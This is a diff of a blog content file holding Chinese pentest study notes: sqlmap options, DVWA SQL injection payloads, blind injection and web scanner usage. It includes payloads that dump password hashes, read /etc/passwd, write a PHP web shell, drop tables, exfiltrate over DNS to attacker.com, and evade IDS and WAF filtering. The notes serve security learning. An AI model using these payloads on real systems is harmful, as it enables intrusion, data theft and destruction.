href="#SQLMAP自动注入—Injection-注入" class="headerlink" title="SQLMAP自动注入—Injection    #注入"></a><strong>SQLMAP自动注入—Injection</strong>    #注入</h4><pre><code>-p    指定扫描的参数,使--level失效    -p &quot;user-agent,referer&quot;--URI注入点    sqlmap -u &quot;http://targeturl/param1/value1*/param2/value2/&quot;--dbms=&quot;mysql&quot;    MySQL&lt;5.0&gt;    Oracle&lt;11i&gt;    Microsoft SQL Server &lt;2005&gt;    PostgreSQL    Microsoft Access    SQLite    Firebird    Sybase    SAP MaxDB    DB2--OS    Linux    Windows--invalid-bignum / --invalid-logical    通常sqlmap使用负值使参数取值失效 id=13-&gt; id=-13    bignum使用大数使参数值失效 id=99999999    Logcal使用布尔判断使取值失效id=13 AND 18=19--no-cast    榨取数据时,sqlmap将所有结果转换为字符串,并用空格替换NULL结果    老版本mysql数据库需要开启此开关--no-escape    出于混淆和避免出错的目的,payload中用单引号界定字符串时,sqlmap使用char()编码逃逸的方法替换字符串    SELECT &apos;foo&apos; -&gt; SELECT CHAR(102)+CHAR(111)+CHAR(111)     本参数将关闭此功能--prefix / --suffix    $query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;;    sqlmap -u &quot;http://1.1.1.1/sqlmap/mysql/get_str_brackets.php?id=1&quot;  -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc“     query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1&quot;;--tamper    #常用    混淆脚本,用于绕过应用层过滤,IPS,WAF    sqlmap -u “http://1.1.1.1/a.php?id=1” --tamper=&quot;between.py,randomcase.py,space2comment.py&quot; -v 3    dpkg -L sqlmap | grep tamper    #kali查找脚本所在路径</code></pre><h4 id="SQLMAP自动注入—Detection-检测"><a href="#SQLMAP自动注入—Detection-检测" class="headerlink" title="SQLMAP自动注入—Detection    #检测"></a><strong>SQLMAP自动注入—Detection</strong>    #检测</h4><pre><code>--level    1-5级(默认1)    /usr/share/sqlmap/xml/payloads--risk    1-4(默认 1/ 无害)    Risk升高可造成数据被篡改等风险(update)--string,--not-string,--regexp,--code,--text--only,--titles    页面比较,基于布尔的注入检测,依据返回页面内容的变化判断真假逻辑,但有些页面随时间阈值变化,此时需要人为指定标识真假的字符串.</code></pre><h4 id="SQLMAP自动注入—Techniques-技术"><a href="#SQLMAP自动注入—Techniques-技术" class="headerlink" title="SQLMAP自动注入—Techniques    #技术"></a><strong>SQLMAP自动注入—Techniques</strong>    #技术</h4><pre><code>默认使用全部技术B:Boolean-based blindE:Error-basedU:Union query-basedS:Stacked queries(文件系统,操作系统,注册表必须)T:Time-based blind--time-sec    基于时间的注入检测相应延迟时间(默认5秒)--union-cols    默认联合查询1-10列,随--level增加最多支持50列    --union-cols 6-9--union-char    联合查询默认使用NULL,极端情况下NULL可能失败,此时可以手动指定数值    --union-char 123--dns-domain    攻击者控制了某DNS服务器,使用此功能可以提高数据榨取的速度    --dns-domain attacker.com--second-order    在一个页面注入的结果,从另一个页面体现出来    --second-order http://1.1.1.1/b.php</code></pre><h4 id="SQLMAP自动注入—Fingerprint-指纹信息"><a href="#SQLMAP自动注入—Fingerprint-指纹信息" class="headerlink" title="SQLMAP自动注入—Fingerprint        #指纹信息"></a><strong>SQLMAP自动注入—Fingerprint</strong>        #指纹信息</h4><pre><code>-f,--fingerprint,-b,--banner    数据库管理系统指纹信息    DBMS,操作系统,架构,补丁</code></pre><h4 id="SQLMAP自动注入—Enumeration-枚举"><a href="#SQLMAP自动注入—Enumeration-枚举" class="headerlink" title="SQLMAP自动注入—Enumeration        #枚举"></a><strong>SQLMAP自动注入—Enumeration</strong>        #枚举</h4><pre><code>--current-user        #查当前数据库账号--current-db        #查当前数据库--hostname            #查主机名--users                #查数据库管理系统所有账号--privileges -U username    (CU 当前账号)    #查用户权限--roles                #查角色--dbs                #查所有数据库--tables,--exclude-sysdbs -D dvwa    #排除系统库,指定数据库查表查列-T users -D dvwa -C user --columns    #指定列查询数据--schema --batch --exclude-sysdbs 元数据(使用默认选项)    #表结构--count                #计数Dump数据    --dump,-C,-T,-D,--start,--stop        #分段备份数据    --dump-all -exclude-sysdbs            #备份所有数据    --sql-query &quot;select * from users&quot;    #根据sql查询语句dump数据</code></pre><h4 id="SQLMAP自动注入—Brute-Force-暴力破解"><a href="#SQLMAP自动注入—Brute-Force-暴力破解" class="headerlink" title="SQLMAP自动注入—Brute Force        #暴力破解"></a><strong>SQLMAP自动注入—Brute Force</strong>        #暴力破解</h4><pre><code>Mysql &lt; 5.0,没有information_schema库Mysql &gt;= 5.0,但无权读取information_schema库微软的access数据库,默认无权读取MSysObjects库--common-tables            #暴力破解表--common-columns    (Access系统表无列信息)    #暴力破解表的列</code></pre><h4 id="SQLMAP自动注入—UDF-Injection-用户自定义函数注入"><a href="#SQLMAP自动注入—UDF-Injection-用户自定义函数注入" class="headerlink" title="SQLMAP自动注入—UDF Injection    #用户自定义函数注入"></a><strong>SQLMAP自动注入—UDF Injection</strong>    #用户自定义函数注入</h4><pre><code>--udf-inject , --shared-lib编译共享库创建并上传至DB Server,以此生成UDF实现高级注入Linux: shared objectWindows: DLLhttp://www.slideshare.net/inquis/advanced-sql-injection-to-operating-systemfull-control-whitepaper-4633857</code></pre><h4 id="SQLMAP自动注入—File-System-文件系统访问"><a href="#SQLMAP自动注入—File-System-文件系统访问" class="headerlink" title="SQLMAP自动注入—File System    #文件系统访问"></a><strong>SQLMAP自动注入—File System</strong>    #文件系统访问</h4><pre><code>--file-read=&quot;/etc/passwd&quot;     #读文件--file-write=&quot;shell.php&quot; --file-dest &quot;/tmp/shell.php&quot;    #写文件并通过--file-dest指定存放位置</code></pre><h4 id="SQLMAP自动注入—OS-操作系统访问"><a href="#SQLMAP自动注入—OS-操作系统访问" class="headerlink" title="SQLMAP自动注入—OS        #操作系统访问"></a><strong>SQLMAP自动注入—OS</strong>        #操作系统访问</h4><pre><code>Mysql,postgresql    上传共享库并生成sys_exec(),sys_eval()两个UDFMssql    xp_cmdshell    储存过程(有就用,禁了启,没有建)    --os-cmd    --os-shell    --sql-shell</code></pre><h4 id="SQLMAP自动注入—Windows-Registory-Windows注册表注入修改"><a href="#SQLMAP自动注入—Windows-Registory-Windows注册表注入修改" class="headerlink" title="SQLMAP自动注入—Windows Registory        #Windows注册表注入修改"></a><strong>SQLMAP自动注入—Windows Registory</strong>        #Windows注册表注入修改</h4><pre><code>--reg-read--reg-add--reg-del--reg-key,--reg-value,--reg-data,--reg-typesqlmap –u=&quot;http://1.1.1.1/a.aspx?id=1&quot; --reg-add --regkey=&quot;HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap&quot; --reg-value=Test -reg-type=REG_SZ --reg-data=1</code></pre><h4 id="SQLMAP自动注入—General-一般常用参数"><a href="#SQLMAP自动注入—General-一般常用参数" class="headerlink" title="SQLMAP自动注入—General        #一般常用参数"></a><strong>SQLMAP自动注入—General</strong>        #一般常用参数</h4><pre><code>-s: sqllite会话文件保存位置-t:    记录流量文件保存位置--charset:强制字符编码    --charset=GBK--crawl: 从起始位置爬站深度    --batch --crawl=3--cvs-del: dump数据默认存于&quot;,&quot;分割的CSV文件中,指定其它分隔符    --csv-del=&quot;;&quot;--dbms-cred:指定数据库账号--flush-session: 清空session--force-ssl            #注入https的网站--fresh-queries        #忽略session查询结果--hex                #dump非ASCLL字符内容时,将其编码为16进制形式,收到后解码还原    sqlmap -u &quot;http://1.1.1.1/s.php?id=1&quot; --hex -v 3--output-dir=/tmp--parse-errors        #分析和现实数据库内建报错信息    sqlmap.py -u &quot;http://1.1.1.1/sqlmap/a.asp?id=1&quot; --parse-errors--save                #将命令保存成配置文件</code></pre><h4 id="SQLMAP自动注入—Miscellaneous-杂项参数"><a href="#SQLMAP自动注入—Miscellaneous-杂项参数" class="headerlink" title="SQLMAP自动注入—Miscellaneous    #杂项参数"></a><strong>SQLMAP自动注入—Miscellaneous</strong>    #杂项参数</h4><pre><code>-z        #参数助记符sqlmap --batch --random-agent --ignore-proxy --technique=BEU -u “1.1.1.1/a.php?id=1&quot;sqlmap -z &quot;bat,randoma,ign,tec=BEU&quot; -u “1.1.1.1/a.php?id=1&quot; sqlmap --ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u “1.1.1.1/a.php?id=1&quot; sqlmap -z &quot;ign,flu,bat,tec=U,dump,D=testdb,T=users&quot; -u “1.1.1.1/ vuln.php?id=1&quot;--answer    sqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --technique=E --answers=&quot;extending=N&quot; --batch--check-waf        #检测WAF/IPS/IDS--hpp            #HTTP parameter pollution    绕过WAF/IPS/IDS的有效方法    尤其对ASP/IIS和ASP.NET/IIS--identify-waf    #彻底的waf/ips/ids检查    支持30多种产品--mobile        #模拟智能手机设备--purge-output    #清除output文件夹--smart            #当有大量检测目标时,只选择基于错误的检测结果--wizard        #向导</code></pre>]]></content>
       
@@ -1775,9 +2201,9 @@
       
         <tags>
             
-            <tag> 数据类型 </tag>
-            
             <tag> mysql </tag>
+            
+            <tag> 数据类型 </tag>
             
         </tags>
       
@@ -1804,9 +2230,9 @@
       
         <tags>
             
-            <tag> mysql </tag>
-            
             <tag> DBS </tag>
+            
+            <tag> mysql </tag>
             
         </tags>
       
@@ -1816,8 +2242,8 @@
     
     <entry>
       <title>手动SQL注入</title>
-      <link href="/2014/05/04/Web_Attacks/SQL%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/"/>
-      <url>/2014/05/04/Web_Attacks/SQL%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/</url>
+      <link href="/2014/05/04/Web_Attacks/SQL_Injection/SQL%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/"/>
+      <url>/2014/05/04/Web_Attacks/SQL_Injection/SQL%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/</url>
       
         <content type="html"><![CDATA[<blockquote><h3 id="手动漏洞挖掘–SQL注入"><a href="#手动漏洞挖掘–SQL注入" class="headerlink" title="手动漏洞挖掘–SQL注入"></a><strong>手动漏洞挖掘–SQL注入</strong></h3></blockquote><ul><li>服务器端程序将用户输入参数作为查询条件,直接拼接SQL语句,并将查询结果返回给客户端浏览器</li></ul><h5 id="用户登录判断"><a href="#用户登录判断" class="headerlink" title="用户登录判断"></a><strong>用户登录判断</strong></h5><pre><code>SELECT * FROM users WHERE user=&apos;uname&apos; AND password=&apos;pass&apos; SELECT * FROM users WHERE user=&apos;name&apos; AND password=&quot; OR &quot;=&apos;&apos; </code></pre><h5 id="基于报错的检测方法-low"><a href="#基于报错的检测方法-low" class="headerlink" title="基于报错的检测方法(low)"></a><strong>基于报错的检测方法(low)</strong></h5><pre><code>&apos; &apos;&apos; % ()</code></pre><h5 id="基于布尔的检测"><a href="#基于布尔的检测" class="headerlink" title="基于布尔的检测"></a><strong>基于布尔的检测</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and &#39;1&#39;&#x3D;1&#39;&#x2F;1&#39; and &#39;1</span><br><span class="line">1&#39; and &#39;1&#39;&#x3D;&#39;2&#x2F;1&#39; and &#39;0</span><br><span class="line">表列数&#x2F;显示信息位于哪一列</span><br><span class="line">&#39; order by 9-- +#按查询列号排序(注释符:--)</span><br><span class="line">select *#时表字段数&#x3D;查询字段数\</span><br></pre></td></tr></table></figure><h5 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a><strong>联合查询</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select 1,2-- +</span><br><span class="line">&#39; union all select database(),2-- +</span><br><span class="line">&#39; union select database(),substring_index(USER(),&quot;@&quot;,1)-- </span><br><span class="line">DB用户:user()</span><br><span class="line">DB版本:version()</span><br><span class="line">全局函数:@@datadir, @@hostname, @@VERSION, @@version_compile_os</span><br><span class="line">当前库:database()</span><br><span class="line">ASCLL转字符:CHAR()</span><br><span class="line">连接字符串:CONCAT_WS(CHAR(32,58,32),user(),database(),version())</span><br><span class="line">计算哈希:md5()</span><br><span class="line">Mysql数据结构</span><br><span class="line">information_schema</span><br><span class="line"></span><br><span class="line">所有库所有表&#x2F;统计每库中表的数量</span><br><span class="line">&#39; union select table_name,table_schema from information_schema.tables--+#查询所有库和表</span><br><span class="line">&#39; UNION select table_schema,count(*) FROM information_Schema.tables group by table_schema --+#查询所有库并统计表的数量</span><br><span class="line"> DVWA库中的表名</span><br><span class="line">&#39; union select table_name,table_schema from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;--+#查询DVWA库中的表名</span><br><span class="line">users表中的所有列(user_id,first_name,first_name,last_name,user,password,avatar)</span><br><span class="line">&#39; union select table_name,column_name from information_schema.columns where table_schema&#x3D;&#39;dvwa&#39; and table_name&#x3D;&#39;users&#39;--+#查询表名中的列</span><br><span class="line">查询user,password列的内容</span><br><span class="line">&#39; union select user,password from dvwa.users--+</span><br><span class="line">&#39; union select user,password from users--+</span><br><span class="line">&#39; union select null, concat(user,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><p><strong>密码破解</strong></p><pre><code>username:passhash------&gt;dvwa.txtjohn --format=raw-MD5 dvwa.txt</code></pre><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a><strong>读取文件</strong></h4><pre><code>&apos; union SELECT null, load_file(&apos;/etc/passwd&apos;)--+</code></pre><h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a><strong>写入文件</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select null,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot; INTO DUMPFILE &quot;&#x2F;var&#x2F; www&#x2F;a.php&quot; --+</span><br><span class="line">Mysql账号</span><br><span class="line">cat php-revers-shell.php | xxd -ps | tr -d &#39;\n&#39;#查看文件二进制数据并输出16进制数据,删除换行</span><br><span class="line">cat php-revers-shell.php | xxd -ps | tr -d &#39;\n&#39;</span><br><span class="line">&#39; union select null, (0x3c3f706870) INTO DUMPFILE &#39;&#x2F;tmp&#x2F;x.php&#39;-- #通过16进制数据在缓存文件夹写入shell</span><br></pre></td></tr></table></figure><h4 id="保存下载数据库"><a href="#保存下载数据库" class="headerlink" title="保存下载数据库"></a><strong>保存下载数据库</strong></h4><pre><code>&apos; union select null, concat(user,0x3a,password) from users INTO OUTFILE &apos;/ tmp/a.db&apos;-- </code></pre><p>新思路:编写服务端代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select null, &#39;&lt;?php if(isset($_POST[&quot;submit&quot;])) &#123; $userID &#x3D; $_POST[&quot;userID&quot;]; $first_name &#x3D; $_POST[&quot;first_name&quot;]; $last_name &#x3D; $_POST[&quot;last_name&quot;]; $username &#x3D; $_POST[&quot;username&quot;]; $avatar &#x3D; $_POST[&quot;avatar&quot;]; echo &quot;userID: $userID&lt;BR&gt;&quot;; echo &quot;first_name: $first_name&lt;BR&gt;&quot;; echo &quot;last_name: $last_name&lt;BR&gt;&quot;; echo &quot;username: $username&lt;BR&gt;&quot;; echo &quot;avatar: $avatar&lt;BR&gt;&quot;; $con&#x3D;mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;&quot;,&quot;dvwa&quot;); if (mysqli_connect_errno()) &#123; echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); &#125; else &#123; echo &quot;Connected to database&lt;BR&gt;&quot;; &#125; $password &#x3D; &quot;123&quot;; $sql&#x3D;&quot;insert into dvwa.users values (\\&quot;$userID\\&quot;,\ \&quot;$first_name\\&quot;,\\&quot;$last_name\\&quot;,\\&quot;$username\\&quot;,MD5(\\&quot;$password\\&quot;),\\&quot;$avatar\ \&quot;)&quot;; if (mysqli_query($con,$sql)) &#123; echo &quot;[Successful Insertion]: $sql&quot;; &#125; else &#123; echo &quot;Error creating database: &quot; . mysqli_error($con); &#125; mysqli_close($con); &#125; ?&gt; &lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;]; ?&gt;&quot;&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;userID&quot; value&#x3D;&quot;33&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;first_name&quot; value&#x3D;&quot;fh&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;last_name&quot; value&#x3D;&quot;y&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;yfh&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;avatar&quot; value&#x3D;&quot;yfh!&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit Form&quot;&gt;&lt;br&gt; &lt;&#x2F;form&gt;&#39; INTO DUMPFILE &#39;&#x2F;tmp&#x2F;user.php&#39; --</span><br></pre></td></tr></table></figure><h4 id="无权读取information-schema库-拒绝union-order-by语句"><a href="#无权读取information-schema库-拒绝union-order-by语句" class="headerlink" title="无权读取information_schema库/拒绝union,order by语句"></a><strong>无权读取information_schema库/拒绝union,order by语句</strong></h4><pre><code>猜列名: &apos; and column is null--+    Burp suite 自动猜列名    find / -name *column*.txt        #寻找字典路径猜当前表表名: &apos; and table.user is null--+猜库里其它表: &apos; and (select dvwa from table)&gt;0--+列表对应关系: &apos; and users.user is null--+猜字段内容:    &apos; or user=&apos;admin            &apos; or user like &apos;%a%猜账号对应密码:    &apos; or user=&apos;admin&apos; and password=&apos;5f4dcc3b5aa765d61d8327deb882cf99</code></pre><h4 id="当数据库可写"><a href="#当数据库可写" class="headerlink" title="当数据库可写"></a><strong>当数据库可写</strong></h4><pre><code>&apos;; update users set user=&apos;yuanfh&apos; where user=&apos;admin    注入失败,sql客户端工具的问题    http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html&apos;; INSERT INTO users (&apos; user_id&apos;,&apos; first_name&apos;,&apos; last_name&apos;,&apos; user&apos;,&apos;password&apos;,&apos;avatar&apos;) VALUES (‘35&apos;,‘fh&apos;,‘yuan&apos;,‘yfh&apos;,&apos;5f4dcc3b5aa765d61d8327deb882cf99&apos;,&apos;OK&apos;);--+ &apos;; DROP TABLE users; -- xp_cmdshell / 存储过程</code></pre><ul><li>SQLi没有通用的方法,掌握原理,了解各种数据库特性</li></ul><p>Medium难度级别</p><pre><code>mysql_real_escape_string()    PHP 4 &gt;= 4.3.0, PHP5PHP 5.5.5.0 已经弃用此函数PHP 7.0.0 已经删除此函数,代之以 MySQLi,PDO_MySQL 转义符,对下列字符转义\x00,\n,\r,\,&apos;,&quot;,\x1a</code></pre><p>high难度级别</p><pre><code>mysql_real_escape_string()stripslashes()    去除&quot;\&quot;is_numeric()    判断是否是数字</code></pre>]]></content>
       
@@ -1849,8 +2275,8 @@
     
     <entry>
       <title>SQL盲注</title>
-      <link href="/2014/05/03/Web_Attacks/SQL%E7%9B%B2%E6%B3%A8/"/>
-      <url>/2014/05/03/Web_Attacks/SQL%E7%9B%B2%E6%B3%A8/</url>
+      <link href="/2014/05/03/Web_Attacks/SQL_Injection/SQL%E7%9B%B2%E6%B3%A8/"/>
+      <url>/2014/05/03/Web_Attacks/SQL_Injection/SQL%E7%9B%B2%E6%B3%A8/</url>
       
         <content type="html"><![CDATA[<blockquote><h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a><strong>SQL盲注</strong></h3></blockquote><ul><li>不显示数据库内建的报错信息</li><li>内建的报错信息帮助开发人员发现和修复问题</li><li>报错信息提供关于系统的大量有用信息</li><li>当程序员隐藏了数据库内建报错信息,替换为通用的错误提示,sql注入将无法依据报错信息判断注入语句的执行结果,既盲</li></ul><p><strong>思路:既然无法基于报错信息判断结果,基于逻辑真假的不同结果来判断</strong></p><pre><code>1&apos; and 1=1--+1&apos; and 1=2--+1&apos; order by 2--+    真1&apos; order by 5--+    假1&apos; union select 1,2--+ 1&apos; union select null,CONCAT_WS(CHAR(32,58,32),user(),database(),version())--+ 1&apos; and 1=0 union select null,table_name from information_schema.tables# 1&apos; and 1=0 union select null,table_name from information_schema.columns where table_name=&apos;users&apos; #</code></pre><h4 id="无权读取information-schema库-拒绝union-order-by-语句"><a href="#无权读取information-schema库-拒绝union-order-by-语句" class="headerlink" title="无权读取information_schema库 / 拒绝union, order by 语句"></a><strong>无权读取information_schema库 / 拒绝union, order by 语句</strong></h4><pre><code>猜列名:    1&apos; and user is not null--+猜当前表表名: 1&apos; and (select count(*) from table)&gt;0--+列表对应关系: 1&apos; and users.user is not null--+猜字段内容:   1&apos; and user=&apos;admin            1&apos; or user like &apos;%a%猜账号对应密码:    2&apos; or user=&apos;admin&apos; and password=&apos;5f4dcc3b5aa765d61d8327deb882cf99 </code></pre><h4 id="Burpsuit-自动化猜解内容"><a href="#Burpsuit-自动化猜解内容" class="headerlink" title="Burpsuit 自动化猜解内容"></a><strong>Burpsuit 自动化猜解内容</strong></h4><p>思路:<br>    真实案例:某电商网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;1.1.1.1&#x2F;goods.php?cnt&#x3D;1&amp;goodsid&#x3D;123</span><br><span class="line">and 1&#x3D;1--+#显示一包纸巾</span><br><span class="line">and 1&#x3D;2--+#显示一袋洗衣粉</span><br><span class="line"></span><br><span class="line">1&#39; and ORD(MID((VERSION()),1,1))&amp;1&gt;0--+</span><br><span class="line">CURRENT_USER()̵DATABASE() </span><br><span class="line">MID(ColumnName, Start [, Length]) </span><br><span class="line"> ORD(string)#ASCLL码</span><br></pre></td></tr></table></figure>]]></content>
       
@@ -1885,7 +2311,7 @@
       <link href="/2014/03/30/Web_Attacks/%E5%B8%B8%E7%94%A8WEB%E7%BB%BC%E5%90%88%E6%89%AB%E6%8F%8F%E7%A8%8B%E5%BA%8F%E7%AE%80%E4%BB%8B/"/>
       <url>/2014/03/30/Web_Attacks/%E5%B8%B8%E7%94%A8WEB%E7%BB%BC%E5%90%88%E6%89%AB%E6%8F%8F%E7%A8%8B%E5%BA%8F%E7%AE%80%E4%BB%8B/</url>
       
-        <content type="html"><![CDATA[<p><strong>环境准备</strong></p><ul><li>Metasploitable2</li><li>DVWA</li></ul><p><strong>侦察</strong><br>    <code>Httrack</code>        #镜像目标网站到本地<br>        减少与目标系统交互</p><h3 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a><strong>扫描工具</strong></h3><ul><li>Nikto</li><li>Vega</li><li>Skipfish</li><li>W3af</li><li>Arachni</li><li>Owasp-zap</li><li>AWVS</li><li>APPSCAN</li></ul><p><del>Web Penetration Testing with Kali Linux        #Read Book,有点过时</del></p><blockquote><h4 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a><strong>Nikto</strong></h4></blockquote><p>Perl语言开发的开源web安全扫描器<br>软件版本<br>搜索存在安全隐患的文件<br>服务器配置漏洞<br>Web Application层面的安全隐患</p><pre><code>避免404误判    很多服务器不遵守RFC标准,对不存在的对象返回200响应码    依据响应文件内容判断,不同扩展名的文件404响应内容不同    去除时间信息后的内容取MD5值    -no404nikto -list-plugins        #插件nikto -update    cirt.net    http://cirt.net/nikto/UPDATES/nikto -host http://1.1.1.1nikto -host 192.168.1.1 -ssl -port 443,8443,995nikto -host host.txt                    #扫描多个目标,目标地址存放到文件nmap -p80 192.168.254.0/24 -oG - | nikto -host -    #结合nmap扫描nikto -host 192.168.254.115 -useproxy http://localhost:8087-vhost</code></pre><p><strong>Nikto-interactive</strong></p><pre><code>Space - report current scan status    #查看扫描状态v - verbose mode on/off     #查看正在扫描的信息d - debug mode on/off        #查看更详细的信息e - error reporting on/off    p - progress reporting on/off    #查看并计算扫描总体进度r - redirect display on/off        #只看状态码为重定向的扫描c - cookie display on/off        a - auth display on/offq - quitN - next hostP - Pause        #暂停扫描</code></pre><p><strong>nikto配置文件</strong></p><pre><code>/etc/nikto.confSTATIC-COOKIE=&quot;cookie1&quot;=&quot;cookie value&quot;,&quot;cookie2&quot;=&quot;cookie value&quot;-evasion:使用LibWhisker中对IDS的躲避技术,可使用以下几种类型    1.随机URL编码(非UTF-8方式)    2.自选择路径(/./)    3.过早结束的URL    4.优先考虑长随机字符串    5.参数欺骗    6.使用TAB作为命令的分隔符    7.使用变化的URL    8.使用Windows路径分隔符&quot;\&quot;nikto -host 192.168.254.115 -evasion 1678        #躲避类型可多选</code></pre><blockquote><h4 id="vega"><a href="#vega" class="headerlink" title="vega"></a><strong>vega</strong></h4></blockquote><p>GUI<br>JAVA编写的开源Web扫描器<br>扫描模式<br>代理模式<br>爬站,处理表单,注入测试<br>支持SSL: <code>http://vega/ca.crt</code></p><blockquote><h4 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a><strong>skipfish</strong></h4></blockquote><ul><li>C语言编写</li><li>实验性的主动web安全评估工具</li><li>递归爬网</li><li>基于字典的探测</li><li>速度较快<br>  多路单线程,全异步网络I/O,消除内存管理和调度开销<br>  启发式自动内容识别</li><li>误报较低<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">skipfish -o test http:&#x2F;&#x2F;1.1.1.1</span><br><span class="line">skipfish -o test @url.txt</span><br><span class="line">skipfish -o test -S complet.wl -W a.wl http:&#x2F;&#x2F;1.1.1.1#使用字典扫描</span><br><span class="line">dpkg -L skipfish | grep wl#查询字典路径</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;skipfish&#x2F;dictionaries&#x2F;minimal.wl#字典路径</span><br><span class="line">-I :只检查包含&#39;string&#39;的URL</span><br><span class="line">-X :不检查包含&#39;string&#39;的URL#logout</span><br><span class="line">-K :不对指定参数进行Fuzz测试</span><br><span class="line">-D :跨站点爬另外一个域</span><br><span class="line">-l :每秒最大请求数</span><br><span class="line">-m :每IP最大并发连接数</span><br><span class="line">skipfish -o skipfishtest -l 10 -m 10 -I &#x2F;dvwa&#x2F; -S &#x2F;usr&#x2F;share&#x2F;skipfish&#x2F;dictionaries&#x2F;minimal.wl http:&#x2F;&#x2F;192.168.254.115</span><br><span class="line">--config :指定配置文件</span><br><span class="line"></span><br><span class="line">身份认证</span><br><span class="line">skipfish -A user:pass -o test http:&#x2F;&#x2F;1.1.1.1</span><br><span class="line">skipfish -C &quot;name&#x3D;val&quot; -o test http:&#x2F;&#x2F;1.1.1.1#cookie登录</span><br><span class="line">表单登录</span><br><span class="line">skipfish -o a --auth-form http:&#x2F;&#x2F;192.168.254.115&#x2F;dvwa&#x2F;login.php --auth-form-target http:&#x2F;&#x2F;192.168.254.115&#x2F;dvwa&#x2F;login.php --auth-user-field username --auth-user admin --auth-pass-field password --auth-pass password --auth-verify-url http:&#x2F;&#x2F;192.168.254.115&#x2F;dvwa&#x2F;index.php -I dvwa http:&#x2F;&#x2F;192.168.254.115&#x2F;dvwa&#x2F;</span><br><span class="line"></span><br><span class="line">扫描结束太快</span><br><span class="line">有可能触发了目标站点的连接数限制,降低 -m -l 数值</span><br></pre></td></tr></table></figure></li></ul><blockquote><h4 id="w3af-Web-Application-Attack-and-Audit-Framework"><a href="#w3af-Web-Application-Attack-and-Audit-Framework" class="headerlink" title="w3af(Web Application Attack and Audit Framework)"></a><strong>w3af</strong>(Web Application Attack and Audit Framework)</h4></blockquote><p>基于python语言开发<br>此框架的目标是帮助你发现和利用所有WEB应用程序漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">10大类近150个plugin</span><br><span class="line">audit#审计</span><br><span class="line">infrastructure#基础架构</span><br><span class="line">grep#被动扫描</span><br><span class="line">evasion#逃避目标的waf,ids检测</span><br><span 